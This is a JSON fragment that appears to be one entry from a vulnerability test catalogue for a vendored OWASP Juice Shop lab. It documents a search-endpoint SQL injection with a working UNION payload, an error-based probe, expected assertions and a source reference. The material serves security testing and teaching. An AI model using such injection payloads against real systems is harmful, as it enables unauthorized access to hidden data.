      "id": "V01",
      "title": "搜索 SQL 注入（UNION 读取隐藏商品）",
      "category": "SQL Injection",
      "owasp": "A03:2021 Injection",
      "severity": "high",
      "auth": "none",
      "uiPath": "/#/search?q=",
      "request": {
        "method": "GET",
        "path": "/rest/products/search",
        "query": {
          "q": "')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--"
        }
      },
      "payload": "')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--",
      "expected": {
        "status": 200,
        "assertions": [
          "data.length == 21",
          "data contains id 1021",
          "id 1021 deletedAt != null"
        ],
        "evidence": "The hidden product 星澜隐藏礼盒（注入可见） (id 1021, price 0.01) appears in the response."
      },
      "errorEvidence": {
        "query": "q=')",
        "status": 500,
        "title": "Error: SQLITE_ERROR: near \")\": syntax error",
        "note": "A lone quote q=' returns 200 with an empty array; use q=') for the error-based evidence."
      },
      "negative": "N01",
      "codeRef": "vendor/juice-shop/routes/search.ts:68",
      "reset": "Read-only."
    },
